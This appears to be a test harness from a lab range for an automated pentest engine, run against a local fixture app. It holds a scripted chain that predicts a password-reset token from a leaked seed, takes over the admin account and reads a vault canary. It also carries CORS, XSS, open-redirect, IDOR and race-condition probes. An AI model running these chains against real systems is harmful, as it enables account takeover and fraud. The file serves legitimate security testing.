// range-iso chainyard lab — the T2 calibrate-on-known-knowns HARNESS (v2 round,
// extended 2026-08-29 with the T4 race-family round: race-window primitive, governed
// last-byte-sync oracle, and the locked-control discrimination proof).
//
// Round 1 (last-verdict from 2026-08-29 morning) proved the gap: chainforge's vertical
// rules compiled only the DECOY (cors-theft); chainrun executed it GREEN with zero
// victim data. This round measures the v2 build against the same fixture:
//
//   DETECTION     — unchanged machinery (guidedWebSearch/pathsearch + header probes)
//   COMPOSITION   — engine/chaincompose.mjs: typed primitives (provides/consumes)
//                   searched via engine/pathsearch.mjs UCT. The winning chain must
//                   compile from primitives with NO bespoke rule for that exact chain.
//   EXECUTION     — composed candidates execute via chainrun v2, which now carries a
//                   chain-level IMPACT assertion (paired control: the terminal request
//                   re-fired without auth headers must be REFUSED and DIFFER).
//   DISCRIMINATION— the decoy now carries an impact assertion too: it must FAIL inside
//                   the executor (hollowSuccess), not merely in this harness.
//   VALIDATOR     — the proven chain becomes a finding via findingFromChain(); it must
//                   pass the validator's objective-oracle gate vocabulary.
//
// Loopback only. No external calls, no writes to live state.
// Run:  node varvel/deploy/range-iso/chainyard/run.mjs   (writes last-verdict.json beside it)

import http from 'node:http';
import { writeFileSync } from 'node:fs';
import { join, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';
import { createChainyardTarget, VAULT_CANARY, BOB_BOOKING_CANARY, RACE_CANARY } from '../../../targets/chainyard.mjs';
import { guidedWebSearch } from '../../../engine/webpaths.mjs';
import { Surface } from '../../../engine/surface.mjs';
import { chainforge } from '../../../engine/chainforge.mjs';
import { composeChains, findingFromChain } from '../../../engine/chaincompose.mjs';
import { hasObjectiveOracle } from '../../../engine/validator.mjs';
import { runChain } from '../../../tools/chainrun.mjs';
import { idorProbe } from '../../../tools/idorprobe.mjs';
import { raceProbe } from '../../../tools/race.mjs';

const HERE = dirname(fileURLToPath(import.meta.url));
const CANARIES = [VAULT_CANARY, BOB_BOOKING_CANARY, RACE_CANARY];

// A realistic seed wordlist for this app shape (what a decent content list carries).
const SEEDS = [
  '/', '/search', '/goto', '/login', '/docs', '/account', '/admin', '/admin/vault',
  '/api', '/api/me', '/api/users', '/api/feed', '/api/bookings/1001', '/api/invoices/2001', '/api/listings/3001',
  '/api/coupons/redeem', '/api/wallet/transfer', '/api/giveaway/enter', '/api/gift/claim',
  '/internal', '/internal/debug',
  '/reset/request', '/reset/confirm', '/lab/revert', '/robots.txt', '/.env', '/.git/HEAD',
];

// Minimal probe with headers (the same observation tools/httpmethods.mjs makes for CORS).
function probe(base, path, { method = 'GET', headers = {}, body = null } = {}) {
  return new Promise((resolve) => {
    const u = new URL(path, base);
    const req = http.request({ hostname: u.hostname, port: u.port, path: u.pathname + u.search, method, headers, timeout: 2000 }, (res) => {
      let b = ''; res.on('data', (d) => { b += d; }); res.on('end', () => resolve({ status: res.statusCode, headers: res.headers, body: b }));
    });
    req.on('error', () => resolve(null)); req.on('timeout', () => { req.destroy(); resolve(null); });
    if (body != null) req.write(body);
    req.end();
  });
}

// The winning chain, hand-authored — kept from round 1 as the CALIBRATION known-known.
// The v2 question is whether the ENGINE can compose its equivalent without this.
export const WINNING_CHAIN = {
  name: 'chainyard-predictable-reset-ato',
  steps: [
    { id: 'leak-seed', path: '/internal/debug', expect: { status: 200, contains: 'RNG_SEED=' },
      extract: { seed: { regex: 'RNG_SEED=([0-9a-f]+)' } }, note: 'L4: the info-leak that makes the reset token computable' },
    { id: 'request-reset', method: 'POST', path: '/reset/request', body: '{"user":"admin"}',
      expect: { status: 200, notContains: 'rset-' }, note: 'L5: token is NOT in the response — prediction, not leakage, delivers it' },
    { id: 'confirm-reset', method: 'POST', path: '/reset/confirm',
      body: '{"user":"admin","token":"rset-{{seed}}-admin","password":"chainrun-lab-pw"}',
      expect: { status: 200, contains: 'session' }, extract: { session: { json: 'session' } },
      note: 'the composed step: predicted token accepted → admin password reset' },
    { id: 'read-vault', path: '/admin/vault', headers: { cookie: 'cy_sess={{session}}' },
      expect: { status: 200, contains: 'CY-VAULT-CANARY' }, note: 'HIGH impact: crown-jewel read as admin' },
    { id: 'revert', method: 'POST', path: '/lab/revert', expect: { status: 200, contains: 'reverted' },
      note: 'lab hygiene: net target change zero' },
  ],
  impact: { step: 'read-vault', contains: 'CY-VAULT-CANARY',
    control: { stripHeaders: ['cookie'], refuseStatus: [403], mustDiffer: true } },
};

// The decoy chain, as chainforge's cors-theft rule compiles it — now WITH the v2 impact
// assertion the primitive actually claims (victim-scoped data). It must FAIL inside the
// executor: SameSite=Strict means the cross-origin read is anonymous.
export const DECOY_CHAIN = {
  name: 'chainyard-cors-theft-decoy',
  steps: [
    { id: 'verify-cors', path: '/api/me', headers: { origin: 'https://attacker.invalid' },
      expect: { status: 200 }, extract: { acao: { header: 'access-control-allow-origin' } },
      note: 'the origin IS reflected with credentials — the primitive is real' },
    { id: 'fetch-data', path: '/api/me', headers: { origin: 'https://attacker.invalid' },
      expect: { status: 200 },
      note: 'the cross-origin read a malicious site gets: anonymous only (SameSite=Strict)' },
  ],
  impact: { step: 'fetch-data', contains: 'admin@' }, // the victim-data hypothesis — must fail
};

export async function runLab({ clock = () => new Date().toISOString() } = {}) {
  const srv = createChainyardTarget();
  srv.on('clientError', (e, sock) => { try { sock.destroy(); } catch {} });
  await new Promise((r) => srv.listen(0, '127.0.0.1', r));
  const base = `http://127.0.0.1:${srv.address().port}`;

  try {
    // ── 1. DETECTION — unchanged from round 1: real machinery ──
    const search = await guidedWebSearch(base, { seedPaths: SEEDS, maxProbes: 48, breadth: 12 });
    const found = new Map();
    for (const t of search.trace) if (t.descriptor.path) found.set(t.descriptor.path, t.cls);
    for (const t of search.top) found.set(t.descriptor.path, t.cls);

    const corsProbe = await probe(base, '/api/me', { headers: { origin: 'https://attacker.invalid' } });
    const xssProbe = await probe(base, '/search?q=%3Csvg%2Fonload%3Dlab%3E');
    const redirProbe = await probe(base, '/goto?next=https://example.invalid/');
    const resetProbe = await probe(base, '/reset/request', { method: 'POST', headers: { 'content-type': 'application/json' }, body: '{"user":"admin"}' });

    const detection = {
      l4_debug_leak: {
        discovered: found.has('/internal/debug'),
        classifiedAs: found.get('/internal/debug') || null,
        detected: found.get('/internal/debug') === 'sensitive-hit',
        note: 'pathsearch classifyResponse scores the KEY=VALUE leak as sensitive-hit (0.95)',
      },
      l2_cors_reflect: {
        detected: !!corsProbe && corsProbe.headers['access-control-allow-origin'] === 'https://attacker.invalid'
          && corsProbe.headers['access-control-allow-credentials'] === 'true',
        note: 'header observation only — the SameSite=Strict impact ceiling is NOT visible to this check',
      },
      l1_self_xss: {
        detected: !!xssProbe && xssProbe.body.includes('<svg/onload=lab>'),
        note: 'unescaped reflection observed; current machinery has no executable-context confirmer',
      },
      l3_open_redirect: {
        detected: !!redirProbe && redirProbe.status === 302 && /example\.invalid/.test(String(redirProbe.headers.location || '')),
      },
      l5_predictable_token: {
        detected: false,
        evidenceShape: resetProbe ? resetProbe.body : null,
        note: 'intrinsically invisible to single-request detection — predictability is provable only in composition; v2 covers it via the predictable-reset-token primitive + shape library',
      },
    };

    // ── surface graph: what the campaign model would carry ──
    const surface = new Surface({ engagement: 'chainyard-lab', signedBy: 'lab', cidrs: ['127.0.0.1/32'] });
    const host = surface.host('127.0.0.1', { label: 'chainyard' });
    const endpoints = [...found.keys()].map((p) => ({ path: p, method: 'GET' }));
    const findings = [];
    if (detection.l2_cors_reflect.detected) findings.push({ title: 'CORS reflects arbitrary origin with credentials on /api/me', sev: 'low' });
    if (detection.l4_debug_leak.detected) findings.push({ title: 'Debug endpoint leaks server state (RNG seed)', sev: 'low' });
    if (detection.l1_self_xss.detected) findings.push({ title: 'Reflected self-XSS on /search (self-only context)', sev: 'info' });
    if (detection.l3_open_redirect.detected) findings.push({ title: 'Open redirect on /goto', sev: 'low' });
    for (const f of findings) surface.finding(host, { title: f.title, sev: f.sev, confidence: 80, evidence: 'lab probe' });

    // ── 2. COMPOSITION — vertical rules (regression) + v2 typed composition ──
    const compiledV1 = chainforge({ endpoints, findings, material: {} });
    const composed = await composeChains({ endpoints, findings, material: { targetUser: 'admin' } });

    // ── 3. EXECUTION — composed candidates run; impact assertion is the oracle ──
    const attempts = [];
    const winners = [];
    for (const chain of composed.chains) {
      const run = await runChain({ ...chain, base });
      const canary = CANARIES.find((c) => run.steps.some((s) => s.ok && s.evidence.includes(c)));
      attempts.push({
        chain: chain.name, stepsOk: run.stepsCompleted === run.stepsTotal,
        impactOk: !!(run.impact && run.impact.ok), canaryReached: !!canary,
        hollow: run.hollowSuccess === true,
        impactDetail: run.impact ? run.impact.detail : (run.steps.find((s) => !s.ok) || {}).error || null,
      });
      if (run.ok && run.impact && run.impact.ok && canary) winners.push({ chain: chain.name, run, canary });
    }
    const idorWinner = winners.find((w) => w.chain.includes('ownership-confusion')) || null;
    const tokenWinner = winners.find((w) => w.chain.includes('predictable-reset-token')) || null;
    const raceWinner = winners.find((w) => w.chain.includes('race-window')) || null;
    const winner = tokenWinner || idorWinner || raceWinner || null; // token family keeps the legacy verdict slot

    // ── 3b. IDOR differential oracle — naive check vs proof-standard classification ──
    // Log in as the published tenant, then probe all three object-route shapes.
    const docsPage = await probe(base, '/docs');
    const tu = /[Tt]enant demo account:\s*<code>(\w+)/.exec(docsPage?.body || '');
    const tp = /[Tt]enant demo account:\s*<code>\w+\s*\/\s*([\w-]+)/.exec(docsPage?.body || '');
    const loginRes = await probe(base, '/login', { method: 'POST', headers: { 'content-type': 'application/x-www-form-urlencoded' }, body: `user=${tu?.[1]}&pass=${tp?.[1]}` });
    const tenantCookie = String(loginRes?.headers?.['set-cookie'] || '').split(';')[0] || null;
    const idorOracle = {};
    if (tenantCookie) {
      for (const [fam, tpl, ownId, otherId] of [
        ['bookings', '/api/bookings/{id}', 1001, 1002],
        ['invoices', '/api/invoices/{id}', 2001, 2002],
        ['listings', '/api/listings/{id}', 3001, 3002],
      ]) {
        idorOracle[fam] = await idorProbe(base, { pathTemplate: tpl, ownId: ownId, otherId: otherId, cookie: tenantCookie });
      }
    }

    // ── 3c. RACE differential oracle — naive parallelism flag vs state-readback proof ──
    // Same tenant session as 3b. The gift fixture is the SAFE control: locked +
    // idempotent (all-200 burst), which the naive heuristic flags and the oracle clears.
    // The coupon fixture also runs the T4 graduation gate: ≥90% over 20 trials.
    const raceOracle = {};
    let raceGraduation = null;
    if (tenantCookie) {
      const h = { cookie: tenantCookie, 'content-type': 'application/json' };
      for (const [fix, spec] of [
        ['coupon', { request: { method: 'POST', path: '/api/coupons/redeem', headers: h, body: '{"code":"WELCOME10"}' }, readback: { path: '/api/coupons/WELCOME10', effect: '"redemptions":(\\d+)' }, concurrency: 6, attempts: 3 }],
        ['wallet', { request: { method: 'POST', path: '/api/wallet/transfer', headers: h, body: '{"to":"bob","amount":60}' }, readback: { path: '/api/wallet', effect: '"debits":(\\d+)' }, concurrency: 3, attempts: 3 }],
        ['giveaway', { request: { method: 'POST', path: '/api/giveaway/enter', headers: h, body: '{}' }, readback: { path: '/api/giveaway', effect: '"yourEntries":(\\d+)' }, concurrency: 6, attempts: 3 }],
        ['gift', { request: { method: 'POST', path: '/api/gift/claim', headers: h, body: '{"code":"GIFT-2026"}' }, readback: { path: '/api/gifts/GIFT-2026', effect: '"claims":(\\d+)' }, concurrency: 6, attempts: 3 }],
      ]) {
        raceOracle[fix] = await raceProbe(base, { ...spec, resetPath: '/lab/revert' });
      }
      const grad = await raceProbe(base, { request: { method: 'POST', path: '/api/coupons/redeem', headers: h, body: '{"code":"WELCOME10"}' }, readback: { path: '/api/coupons/WELCOME10', effect: '"redemptions":(\\d+)' }, resetPath: '/lab/revert', concurrency: 6, attempts: 20 });
      raceGraduation = { trials: grad.attempts, rate: grad.rate, passed: grad.verdict === 'raced' && grad.rate >= 0.9, note: 'T4 graduation gate: ≥90% race reproduction over 20 trials' };
    }

    // Calibration known-known + decoy fate (both now carry impact assertions)
    const knownKnown = await runChain({ ...WINNING_CHAIN, base });
    const decoyRun = await runChain({ ...DECOY_CHAIN, base });

    // paired control for the reset claim: a WRONG token must be refused
    const control = await probe(base, '/reset/confirm', { method: 'POST', headers: { 'content-type': 'application/json' }, body: '{"user":"admin","token":"rset-deadbeef-admin","password":"x"}' });

    // ── 4. VALIDATOR hookup — the proven composed chain becomes a finding ──
    let validatedFinding = null;
    if (winner) {
      const f = findingFromChain(winner.run, { title: 'Predictable password-reset token → admin account takeover (composed)', sev: 'high' });
      validatedFinding = { ...f, passesOracleGate: !f.error && hasObjectiveOracle(f) };
    }

    const decoyRuleCompiled = compiledV1.plans.find((p) => p.rule === 'cors-theft');

    return {
      lab: 'range-iso/chainyard (v2 round)',
      at: clock(),
      fixture: { target: 'targets/chainyard.mjs', base, seeds: SEEDS.length, probes: search.probes, searchActivated: search.activated },
      detection,
      composition: {
        v1Vertical: {
          plansCompiled: compiledV1.plans.map((p) => ({ rule: p.rule, title: p.title, confidence: p.confidence })),
          note: 'regression view: chainforge v1 still compiles only the decoy — preserved for comparison',
          decoyCompiled: !!decoyRuleCompiled,
        },
        v2Composed: {
          candidates: composed.chains.map((c) => ({ name: c.name, steps: c.steps.length, confidence: c.confidence })),
          search: composed.search,
          gaps: composed.gaps,
          honest: composed.honest,
        },
        engineComposedWinner: !!winner,
        winnerChain: winner ? winner.chain : null,
        idorWinnerChain: idorWinner ? idorWinner.chain : null,
        raceWinnerChain: raceWinner ? raceWinner.chain : null,
      },
      race: {
        // The governed oracle vs the naive parallelism heuristic, per fixture.
        oracle: Object.fromEntries(Object.entries(raceOracle).map(([k, v]) => [k, {
          verdict: v.verdict, rate: v.rate, naiveWouldFlag: v.naiveWouldFlag,
          sequential: v.sequential, concurrent: v.concurrent, detail: v.detail,
        }])),
        discriminationProof: raceOracle.coupon && raceOracle.wallet && raceOracle.giveaway && raceOracle.gift ? {
          naiveFlagsAllFour: raceOracle.coupon.naiveWouldFlag && raceOracle.wallet.naiveWouldFlag && raceOracle.giveaway.naiveWouldFlag && raceOracle.gift.naiveWouldFlag,
          oracleSorted: raceOracle.coupon.verdict === 'raced' && raceOracle.wallet.verdict === 'raced' && raceOracle.giveaway.verdict === 'raced' && raceOracle.gift.verdict === 'single-effect',
          safeControlCleared: raceOracle.gift.verdict === 'single-effect' && raceOracle.gift.naiveWouldFlag === true,
        } : null,
        graduation: raceGraduation,
        composedChainProved: !!raceWinner,
        controlFate: (attempts.find((a) => a.chain.includes('race-window:gift-claim')) || {}).stepsOk === false ? 'honest stop at race-fire (single-effect — locked/idempotent)' : 'see attempts',
      },
      idor: {
        // The differential oracle vs the naive scanner check, per object family.
        oracle: Object.fromEntries(Object.entries(idorOracle).map(([k, v]) => [k, { verdict: v.verdict, naiveWouldFlag: v.naiveWouldFlag, detail: v.detail }])),
        discriminationProof: idorOracle.bookings && idorOracle.invoices && idorOracle.listings ? {
          naiveFlagsAllThree: idorOracle.bookings.naiveWouldFlag && idorOracle.invoices.naiveWouldFlag && idorOracle.listings.naiveWouldFlag,
          oracleSorted: idorOracle.bookings.verdict === 'idor' && idorOracle.invoices.verdict === 'enforced' && idorOracle.listings.verdict === 'public',
        } : null,
        composedChainProved: !!idorWinner,
        decoyFates: {
          invoice: (attempts.find((a) => a.chain.includes('ownership-confusion:invoice')) || {}).stepsOk === false ? 'honest stop (cross-tenant 404)' : 'see attempts',
          listing: (attempts.find((a) => a.chain.includes('ownership-confusion:listing')) || {}).stepsOk === false ? 'honest stop (id space mismatch / no leak)' : 'see attempts',
        },
      },
      execution: {
        attempts,
        winnerProven: !!winner,
        knownKnownCalibration: {
          ok: knownKnown.ok, impactOk: !!(knownKnown.impact && knownKnown.impact.ok),
          canaryReached: knownKnown.steps.some((s) => s.evidence && s.evidence.includes(VAULT_CANARY)),
        },
        pairedControl: { wrongTokenStatus: control?.status ?? null, refused: control?.status === 403 },
      },
      discrimination: {
        decoyStepsPassed: decoyRun.stepsCompleted === decoyRun.stepsTotal,
        decoyRunOk: decoyRun.ok,
        decoyHollowSuccess: decoyRun.hollowSuccess === true,
        decoyImpactDetail: decoyRun.impact ? decoyRun.impact.detail : null,
        note: 'v2: the decoy must fail INSIDE the executor (ok:false, hollowSuccess:true) — no harness-level rescue',
      },
      validator: {
        findingProduced: !!validatedFinding && !validatedFinding.error,
        passesOracleGate: validatedFinding ? validatedFinding.passesOracleGate === true : false,
        finding: validatedFinding && !validatedFinding.error ? { title: validatedFinding.title, sev: validatedFinding.sev } : null,
      },
      verdict: {
        detect: Object.values(detection).filter((d) => d.detected).length + '/5 lows detected (L5 remains composition-only by design)',
        compose: winner ? `ENGINE COMPOSED + EXECUTED: ${winner.chain}` : 'still a gap — see execution.attempts',
        idor: idorWinner ? `IDOR family composed + impact-proven: ${idorWinner.chain}` : 'IDOR chain not proven — see idor.oracle',
        race: raceWinner && raceGraduation ? `race family composed + impact-proven: ${raceWinner.chain} (graduation rate ${raceGraduation.rate} over ${raceGraduation.trials} trials)` : 'race chain not proven — see race.oracle',
        discriminate: decoyRun.hollowSuccess ? 'PASS — decoy failed inside the executor (hollowSuccess)' : 'FAIL — decoy not killed by the executor',
      },
    };
  } finally {
    await new Promise((r) => srv.close(r));
  }
}

const invokedAsMain = process.argv[1] && /run\.mjs$/i.test(process.argv[1].replace(/\\/g, '/'));
if (invokedAsMain) {
  runLab().then((v) => {
    const file = join(HERE, 'last-verdict.json');
    writeFileSync(file, JSON.stringify(v, null, 2));
    console.log('chainyard lab verdict (v2) -> ' + file);
    console.log('  DETECTION:      ' + v.verdict.detect);
    console.log('  COMPOSITION:    ' + v.verdict.compose);
    console.log('  IDOR FAMILY:    ' + v.verdict.idor);
    console.log('  RACE FAMILY:    ' + v.verdict.race);
    console.log('  DISCRIMINATION: ' + v.verdict.discriminate);
    if (v.idor.discriminationProof) console.log(`  idor oracle:      naive flags all 3 shapes: ${v.idor.discriminationProof.naiveFlagsAllThree}; differential sorted idor/enforced/public: ${v.idor.discriminationProof.oracleSorted}`);
    if (v.race.discriminationProof) console.log(`  race oracle:      naive flags all 4 fixtures: ${v.race.discriminationProof.naiveFlagsAllFour}; oracle sorted raced×3/single-effect: ${v.race.discriminationProof.oracleSorted}; safe control cleared while naive-flagged: ${v.race.discriminationProof.safeControlCleared}`);
    if (v.race.graduation) console.log(`  race graduation:  ${v.race.graduation.passed ? 'PASS' : 'FAIL'} — rate ${v.race.graduation.rate} over ${v.race.graduation.trials} trials (gate ≥0.9)`);
    console.log('  VALIDATOR:      ' + (v.validator.passesOracleGate ? 'finding passes the oracle gate' : 'no gate-passing finding'));
    console.log('  attempts:');
    for (const a of v.execution.attempts) console.log(`    ${a.impactOk && a.canaryReached ? '✔' : '✖'} ${a.chain}  steps:${a.stepsOk} impact:${a.impactOk} canary:${a.canaryReached}`);
  }).catch((e) => { console.error('lab run failed: ' + String((e && e.stack) || e)); process.exitCode = 1; });
}
